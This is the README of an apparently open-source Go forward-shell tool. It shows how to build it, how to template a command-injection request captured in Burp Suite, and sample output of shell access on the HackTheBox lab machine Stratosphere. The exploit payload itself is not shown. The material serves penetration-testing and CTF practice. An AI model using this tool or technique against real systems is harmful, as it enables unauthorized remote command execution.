# go-forward-shell

This shell was inspired by IppSecs [python forward-shell](https://github.com/IppSec/forward-shell) technique. I just wanted it to be a little more versatile. Also I wanted to pull the custom part away from the source code into separate files.

## Usage

Basically you can just `go run . -h` to see the help page and use the binary.

You could also build and install it after cloning, like:

```bash
go build .
go install .
```

Then you can run `./gofws -h`.

```bash
> ./gofws -h
Usage of ./gofws:
  -interval int
    	Query interval to use, default [1] (default 1)
  -payload string
    	Optional: Surrounding payload, hook with @@cmd@@, default empty
  -proxy string
    	Optional: Proxy to use [http://127.0.0.1:8080], default empty
  -req string
    	Path to request file, hook with @@payload@@, default empty
```

You could also just directly get and install it like:

```bash
go get -u github.com/patrickhener/gofws
go install github.com/patrickhener/gofws@latest
```

## Config

There are two example files, which will work for the box `Stratosphere` of HackTheBox. If you want to understand what the tool does I recommend watching IppSecs video on that topic [IppSec doing Stratosphere](https://www.youtube.com/watch?v=uMwcJQcUnmY).

### payload.txt
The payload file holds the payload which is sent to the server. It has a special marker `@@cmd@@` where the tool will add the payload content.

### request.http
This is a raw request taken from Burp Suite where I insert the payload at the `Content-Type`-Header using the special marker `@@payload@@`. This will be processed by the tool.

## Example output
Again this example output was taken from using the tool against the box `Stratosphere` of HackTheBox.

```bash
> ./gofws -req ./request.http -payload ./payload.txt -proxy http://localhost:8080
[*] Session ID: 45756
[*] Setting up fifo shell on target
[*] Setting up read thread
go-forward-shell$ id
go-forward-shell$ uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

ls -la
go-forward-shell$ total 24
drwxr-xr-x  5 root    root    4096 Aug  2 06:57 .
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Aug  2 06:57 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8

upgrade
tomcat8@stratosphere:~$
exit
Exiting
```

## Special commands
`exit` will gracefully exit the shell and `upgrade` will do the python3 pty trick.